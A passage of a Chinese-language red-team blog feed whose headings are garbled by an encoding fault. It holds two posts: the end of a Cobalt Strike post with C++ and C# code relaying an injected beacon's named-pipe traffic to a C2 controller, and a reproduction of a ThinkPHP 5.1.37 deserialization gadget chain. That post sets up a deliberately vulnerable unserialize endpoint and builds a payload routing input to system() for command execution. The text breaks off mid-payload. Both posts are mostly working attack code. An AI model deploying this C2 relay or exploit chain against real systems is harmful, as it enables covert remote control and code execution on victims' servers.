pipe</span><br><span class="line">void sendToBeacon(HANDLE pipe, const char *data, DWORD len) &#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">"Write data to our injected beacon via a named pipe"</span> &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">	DWORD bytesWritten = <span class="number">0</span>;</span><br><span class="line">	WriteFile(pipe, &amp;len, <span class="number">4</span>, &amp;bytesWritten, NULL);</span><br><span class="line">	WriteFile(pipe, data, len, &amp;bytesWritten, NULL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	DWORD payloadLen = <span class="number">0</span>;</span><br><span class="line">	char *payloadData = NULL;</span><br><span class="line">	HANDLE beaconPipe = INVALID_HANDLE_VALUE;</span><br><span class="line"></span><br><span class="line">	// Create a connection back to our C2 controller</span><br><span class="line">	SOCKET c2socket = createC2Socket(<span class="string">"172.16.247.10"</span>, <span class="number">8081</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	// Loop until the pipe <span class="keyword">is</span> up <span class="keyword">and</span> ready to use</span><br><span class="line">	<span class="keyword">while</span> (beaconPipe == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">"Create our IPC pipe for talking to the C2 beacon"</span> &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">		// Create our IPC pipe <span class="keyword">for</span> talking to the C2 beacon</span><br><span class="line">		Sleep(<span class="number">500</span>);</span><br><span class="line">		beaconPipe = connectBeaconPipe(<span class="string">"\\\\.\\pipe\\xpntest"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (true) &#123;</span><br><span class="line">		// Start the pipe dance</span><br><span class="line">		payloadData = recvFromBeacon(beaconPipe, &amp;payloadLen);</span><br><span class="line">		<span class="keyword">if</span> (payloadLen == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		sendData(c2socket, payloadData, payloadLen);</span><br><span class="line">		free(payloadData);</span><br><span class="line"></span><br><span class="line">		payloadData = recvData(c2socket, &amp;payloadLen);</span><br><span class="line">		<span class="keyword">if</span> (payloadLen == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		sendToBeacon(beaconPipe, payloadData, payloadLen);</span><br><span class="line">		free(payloadData);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ç®¡é“é€šä¿¡åªèƒ½ç‚¹å¯¹ç‚¹"><a href="#ç®¡é“é€šä¿¡åªèƒ½ç‚¹å¯¹ç‚¹" class="headerlink" title="ç®¡é“é€šä¿¡åªèƒ½ç‚¹å¯¹ç‚¹"></a>ç®¡é“é€šä¿¡åªèƒ½ç‚¹å¯¹ç‚¹</h2><p><img src="./1571909112088.png" alt="Alt text"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.IO.Pipes;</span><br><span class="line">using System.Threading;</span><br><span class="line"></span><br><span class="line">namespace ConsoleApp1</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F;connect to beacon</span><br><span class="line">            NamedPipeClientStream pipeClient &#x3D; new NamedPipeClientStream(&quot;\\\\.\\&quot;, &quot;xpntest&quot;, PipeDirection.InOut);</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(&quot;[client] Attemping to connect to pipe...&quot;);</span><br><span class="line">            pipeClient.Connect();</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(&quot;[client] connected to pipe&quot;);</span><br><span class="line">            Console.WriteLine(&quot;[client] There are currently &#123;0&#125; pipe server instances open.&quot;, pipeClient.NumberOfServerInstances);</span><br><span class="line"></span><br><span class="line">            StreamWriter writer &#x3D; new StreamWriter(pipeClient);</span><br><span class="line">            StreamReader reader &#x3D; new StreamReader(pipeClient);</span><br><span class="line">            writer.AutoFlush &#x3D; true;</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F;create pipe to write</span><br><span class="line">            NamedPipeServerStream pipeWriteServer1 &#x3D; new NamedPipeServerStream(&quot;hlwrite&quot;, PipeDirection.InOut);</span><br><span class="line">            NamedPipeClientStream pipeWriteClient1 &#x3D; new NamedPipeClientStream(&quot;\\\\.\\&quot;, &quot;hlwrite&quot;, PipeDirection.InOut);</span><br><span class="line">            pipeWriteClient1.Connect();</span><br><span class="line">            StreamWriter pipeWriteClientWriter &#x3D; new StreamWriter(pipeWriteClient1);</span><br><span class="line">            pipeWriteClientWriter.AutoFlush &#x3D; true;</span><br><span class="line">            &#x2F;&#x2F;create pipe to read</span><br><span class="line">            NamedPipeServerStream pipeReadServer2 &#x3D; new NamedPipeServerStream(&quot;hlread&quot;, PipeDirection.InOut);</span><br><span class="line">            NamedPipeClientStream pipeReadClient2 &#x3D; new NamedPipeClientStream(&quot;\\\\.\\&quot;, &quot;hlread&quot;, PipeDirection.InOut);</span><br><span class="line">            pipeReadClient2.Connect();</span><br><span class="line">            StreamReader pipeReadClientReader &#x3D; new StreamReader(pipeReadClient2);</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(&quot;All pipes are ok.&quot;);</span><br><span class="line"></span><br><span class="line">            Thread readOnlyThread &#x3D; new Thread(() &#x3D;&gt; ReadOnlyPipeProcess(reader, pipeWriteClientWriter));</span><br><span class="line">            readOnlyThread.IsBackground &#x3D; true;</span><br><span class="line">            readOnlyThread.Start();</span><br><span class="line"></span><br><span class="line">            Thread WriteOnlyThread &#x3D; new Thread(() &#x3D;&gt; WriteOnlyPipeProcess(pipeReadClientReader, writer));</span><br><span class="line">            WriteOnlyThread.IsBackground &#x3D; true;</span><br><span class="line">            WriteOnlyThread.Start();</span><br><span class="line"></span><br><span class="line">            readOnlyThread.Join();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static uint read_frame(StreamReader reader, string buffer)</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F;First, read size.</span><br><span class="line">            uint frame_size &#x3D; 0;</span><br><span class="line">            int i &#x3D; 0;</span><br><span class="line">            byte[] size &#x3D; new byte[4];</span><br><span class="line">            for (i &#x3D; 0; i &lt; 4; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                size[i] &#x3D; (Byte)reader.Read();</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F;Array.Reverse(size);</span><br><span class="line">            frame_size &#x3D; BitConverter.ToUInt32(size, 0);</span><br><span class="line">            Console.WriteLine(&quot;read_frame length: &#123;0&#125;.&quot;, frame_size);</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F;Second, read data</span><br><span class="line">            byte[] data &#x3D; new byte[frame_size];</span><br><span class="line">            for (i &#x3D; 0; i &lt; frame_size; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                data[i] &#x3D; (Byte)reader.Read();</span><br><span class="line">            &#125;</span><br><span class="line">            buffer &#x3D; System.Text.Encoding.ASCII.GetString(data);</span><br><span class="line">            Console.WriteLine(&quot;The frame data is: &#123;0&#125;&quot;, buffer);</span><br><span class="line">            return frame_size;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static void write_frame(StreamWriter writer, string buffer)</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F;Get buffer size </span><br><span class="line">            int frame_size &#x3D; buffer.Length;</span><br><span class="line">            int i;</span><br><span class="line">            Console.WriteLine(&quot;write_frame length: &#123;0&#125;.&quot;, frame_size);</span><br><span class="line">            byte[] size &#x3D; BitConverter.GetBytes(frame_size);</span><br><span class="line">            &#x2F;&#x2F;Array.Reverse(size);</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F;First, write size</span><br><span class="line">            for (i &#x3D; 0; i &lt; size.Length; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                writer.Write(size[0]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F;Second, write data</span><br><span class="line">            for (i &#x3D; 0; i &lt; frame_size; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                writer.Write(buffer[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;read data from beacon and write into own pipe</span><br><span class="line">        public static void ReadOnlyPipeProcess(StreamReader reader, StreamWriter writer)</span><br><span class="line">        &#123;</span><br><span class="line">            string buffer &#x3D; &quot;&quot;;</span><br><span class="line">            while (true)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(&quot;Client want read.&quot;);</span><br><span class="line">                uint length &#x3D; read_frame(reader, buffer);</span><br><span class="line">                Console.WriteLine(&quot;Read from beacon &#123;0&#125;.&quot;, length);</span><br><span class="line">                write_frame(writer, buffer);</span><br><span class="line">                buffer &#x3D; &quot;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;read data from own pipe and write into beacon</span><br><span class="line">        public static void WriteOnlyPipeProcess(StreamReader reader, StreamWriter writer)</span><br><span class="line">        &#123;</span><br><span class="line">            string buffer &#x3D; &quot;&quot;;</span><br><span class="line">            while (true)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(&quot;Beacon want read.&quot;);</span><br><span class="line">                uint length &#x3D; read_frame(reader, buffer);</span><br><span class="line">                Console.WriteLine(&quot;Write to beacon &#123;0&#125;.&quot;, length);</span><br><span class="line">                write_frame(writer, buffer);</span><br><span class="line">                buffer &#x3D; &quot;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="http://www.jeyzhang.com/csharp-learning-notes-2-multithreading.html">C#å­¦ä¹ ç¬”è®°2ï¼šå¤šçº¿ç¨‹</a><br><a href="https://www.cnblogs.com/HDK2016/p/9840989.html">è§£æC#ä¸­ç®¡é“æµçš„ä½¿ç”¨</a><br><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.io.streamreader.read?redirectedfrom=MSDN&view=netframework-4.8#System_IO_StreamReader_Read">StreamReader.Read Method</a><br><a href="https://www.codeproject.com/Articles/1199046/A-Csharp-Named-Pipe-Library-That-Supports-Multiple">A C# Named Pipe Library That Supports Multiple Clients</a><br><a href="https://github.com/meilidao12/DataBase2CiChuChen/tree/04e9d554a4429c861aec9b486fae2e9a2e58f260/CommunicationServers/Pipe">CommunicationServers/Pipe/</a></p>
]]></content>
      <categories>
        <category>redteam trick</category>
      </categories>
      <tags>
        <tag>cobaltstrike</tag>
      </tags>
  </entry>
  <entry>
    <title>thinkphp ååºåˆ—åŒ–ç³»åˆ—gadget å¤ç°</title>
    <url>/2019/10/18/thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97gadget%20%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<!-- thinkphp ååºåˆ—åŒ–ç³»åˆ—gadget å¤ç° è‰ç¨¿ -->
<!-- more -->

<h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><p>å®‰è£…composer</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -sS https://getcomposer.org/installer | php</span><br><span class="line">mv composer.phar /usr/<span class="built_in">local</span>/bin/composer</span><br><span class="line">composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/</span><br></pre></td></tr></table></figure>


<p>å®‰è£…å¯¹åº”ç‰ˆæœ¬çš„tpåï¼Œä¿®æ”¹index controllerçš„indexæ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	unserialize($_POST[<span class="string">'payload'</span>]);</span><br><span class="line">	<span class="keyword">return</span> <span class="string">"Over"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ThinkPHP5-1-X"><a href="#ThinkPHP5-1-X" class="headerlink" title="ThinkPHP5.1.X"></a>ThinkPHP5.1.X</h2><p>å®‰è£…tp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink&#x2F;think tp5137</span><br><span class="line">cd tp5137</span><br><span class="line">vim composer.json # æŠŠ&quot;topthink&#x2F;framework&quot;: &quot;5.1.*&quot;æ”¹æˆ&quot;topthink&#x2F;framework&quot;: &quot;5.1.37&quot;</span><br><span class="line">composer update</span><br></pre></td></tr></table></figure>

<p>think\process\pipes;<br><img src="./1571057688760.png" alt="Alt text"></p>
<p>think\model\concern\Conversion<br><img src="./1571057946874.png" alt="Alt text"></p>
<p>è¦è¿›å…¥çº¢æ¡†é€»è¾‘<br><img src="./1571108743808.png" alt="Alt text"><br><img src="./1571108805023.png" alt="Alt text"></p>
<p><img src="./1571058276229.png" alt="Alt text"><br><img src="./1571108898933.png" alt="Alt text"></p>
<p>åŸºæœ¬ä¸Šæ‰©å±•åˆ°è°ƒç”¨ä»»æ„ç±»çš„ä»»æ„æ–¹æ³•<br><img src="./1571058420105.png" alt="Alt text"></p>
<p><img src="./1571132940856.png" alt="Alt text"></p>
<p>filter<br><img src="./1571058910782.png" alt="Alt text"></p>
<p><img src="./1571059077195.png" alt="Alt text"><br>æ‰€ä»¥å¦‚æœå®åœ¨è¦ç”¨inputï¼Œå°±éœ€è¦è¿‚å›å³æŸ¥æ‰¾æœ‰å“ªäº›æ–¹æ³•å†…éƒ¨ä½¿ç”¨äº†inputï¼Œå¯ä»¥æ‰¾åˆ°paramã€‚<br><img src="./1571069043977.png" alt="Alt text"><br>ä¸è¿‡    $nameå‚æ•°è¿™é‡Œæ˜¯åˆšæ‰åˆå¹¶æ•°ç»„åç¬¬ä¸€ä¸ªå‚æ•°$thisä¼ å›åˆ°inputç¬¬äºŒä¸ªå‚æ•°åï¼Œä¼šå¼ºåˆ¶ç±»å‹è½¬æ¢æˆstringã€‚<br><img src="./1571069278036.png" alt="Alt text"><br>æ‰€ä»¥è¦å¼ºè¡Œç”¨inputå°±è¦ç»§ç»­æ‰¾å…¶å®ƒè°ƒç”¨inputçš„æ–¹æ³•ï¼Œæˆ–è€…è°ƒç”¨paramçš„æ–¹æ³•ã€‚<br><img src="./1571069583452.png" alt="Alt text"><br>è¿™æ ·inputçš„ç¬¬ä¸€ä¸ªå‚æ•°å’Œç¬¬äºŒä¸ªå‚æ•°éƒ½å¯æ§äº†ã€‚</p>
<p>æœ€åçš„payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span> &#123;</span><br><span class="line">        <span class="title">class</span> <span class="title">Windows</span> &#123;</span><br><span class="line">            <span class="title">private</span> $<span class="title">files</span> = [];</span><br><span class="line">            <span class="keyword">private</span> $fileHandles = [];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;close();</span><br><span class="line">                <span class="keyword">$this</span>-&gt;removeFiles();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;fileHandles <span class="keyword">as</span> $handle) &#123;</span><br><span class="line">                    fclose($handle);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;fileHandles = [];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">                        @unlink($filename);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;files = [];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setFile</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;files[] = $value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span> &#123;</span><br><span class="line">        <span class="title">trait</span> <span class="title">Conversion</span>&#123;</span><br><span class="line">            protected $append = ['key' =&gt; array()];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                $item       = [];</span><br><span class="line">                $hasVisible = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;append)) &#123;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;append <span class="keyword">as</span> $key =&gt; $name) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (is_array($name)) &#123;</span><br><span class="line">                            $relation = <span class="keyword">$this</span>-&gt;getRelation($key);</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (!$relation) &#123;</span><br><span class="line">                                $relation = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">                                $relation-&gt;visible($name);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            $item[$key] = $relation-&gt;append($name)-&gt;toArray();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> $item;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span><span class="params">($options = JSON_UNESCAPED_UNICODE)</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> json_encode(<span class="keyword">$this</span>-&gt;toArray(), $options);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;toJson();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">trait</span> RelationShip&#123;</span><br><span class="line">            <span class="keyword">private</span> $relation = [];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelation</span><span class="params">($name = null)</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation;</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setRelation</span><span class="params">($key, $relation)</span></span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;relation[$key] = $relation;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">trait</span> Attribute&#123;</span><br><span class="line">            <span class="keyword">private</span> $filter;</span><br><span class="line">            <span class="keyword">private</span> $data = [<span class="string">'key'</span> =&gt; <span class="string">''</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">($name, &amp;$item = null)</span></span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    $notFound = <span class="keyword">false</span>;</span><br><span class="line">                    $value    = <span class="keyword">$this</span>-&gt;getData($name);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InvalidArgumentException $e) &#123;</span><br><span class="line">                    $notFound = <span class="keyword">true</span>;</span><br><span class="line">                    $value    = <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> $value;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">($name = null)</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$name];</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> InvalidArgumentException(<span class="string">'property not exists:'</span> . <span class="keyword">static</span>::class . <span class="string">'-&gt;'</span> . $name);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setData</span><span class="params">($key, $value)</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;data[$key] = $value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">        <span class="title">class</span> <span class="title">Request</span>&#123;</span><br><span class="line">            <span class="title">protected</span> $<span class="title">mergeParam</span> = <span class="title">True</span>;</span><br><span class="line">            <span class="keyword">protected</span> $hook = [<span class="string">'visible'</span> =&gt; <span class="string">''</span>];</span><br><span class="line">            <span class="keyword">protected</span> $param = [<span class="string">'payload'</span>=&gt;<span class="keyword">array</span>(<span class="string">'whoami'</span>)]; <span class="comment">//inputçš„ç¬¬ä¸€ä¸ªå‚æ•°</span></span><br><span class="line">            <span class="keyword">protected</span> $config = [<span class="string">'var_ajax'</span> =&gt; <span class="string">'payload'</span>]; <span class="comment">//var_ajaxæ‰€å¯¹åº”å€¼æ˜¯inputçš„ç¬¬äºŒä¸ªå‚æ•°</span></span><br><span class="line">            <span class="keyword">protected</span> $filter = [<span class="string">'system'</span>];</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $args)</span></span>&#123;</span><br><span class="line">                <span class="comment">#var_dump($this-&gt;hook[$method]);</span></span><br><span class="line">                <span class="keyword">if</span> (array_key_exists($method, <span class="keyword">$this</span>-&gt;hook)) &#123;</span><br><span class="line">                    array_unshift($args, <span class="keyword">$this</span>);</span><br><span class="line">                    <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;hook[$method], $args);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'method not exists:'</span> . <span class="keyword">static</span>::class . <span class="string">'-&gt;'</span> . $method);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span><span class="params">($data = [], $name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line"> </span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">false</span> === $name) &#123;</span><br><span class="line">                    <span class="keyword">return</span> $data;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                $name = (string) $name;</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">''</span> != $name) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (strpos($name, <span class="string">'/'</span>)) &#123;</span><br><span class="line">                        <span class="keyword">list</span>($name, $type) = explode(<span class="string">'/'</span>, $name);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    $data = <span class="keyword">$this</span>-&gt;getData($data, $name);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (is_null($data)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> $default;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (is_object($data)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> $data;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                $filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</span><br><span class="line">                <span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">                    array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</span><br><span class="line">                    <span class="keyword">if</span> (version_compare(PHP_VERSION, <span class="string">'7.1.0'</span>, <span class="string">'&lt;'</span>)) &#123;</span><br><span class="line">                        <span class="keyword">$this</span>-&gt;arrayReset($data);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;filterValue($data, $name, $filter);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">(array $data, $name)</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">foreach</span> (explode(<span class="string">'.'</span>, $name) <span class="keyword">as</span> $val) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">isset</span>($data[$val])) &#123;</span><br><span class="line">                        $data = $data[$val];</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">return</span> $data;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span><span class="params">($filter, $default)</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (is_null($filter)) &#123;</span><br><span class="line">                    $filter = [];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $filter = $filter ?: <span class="keyword">$this</span>-&gt;filter;</span><br><span class="line">                    <span class="keyword">if</span> (is_string($filter) &amp;&amp; <span class="keyword">false</span> === strpos($filter, <span class="string">'/'</span>)) &#123;</span><br><span class="line">                        $filter = explode(<span class="string">','</span>, $filter);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        $filter = (<span class="keyword">array</span>) $filter;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                $filter[] = $default;</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">return</span> $filter;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span><span class="params">(&amp;$value, $key, $filters)</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="comment">#($filters, $value);</span></span><br><span class="line">                $default = array_pop($filters);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">foreach</span> ($filters <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (is_callable($filter)) &#123;</span><br><span class="line">                        $value = call_user_func($filter, $value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> $value;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">            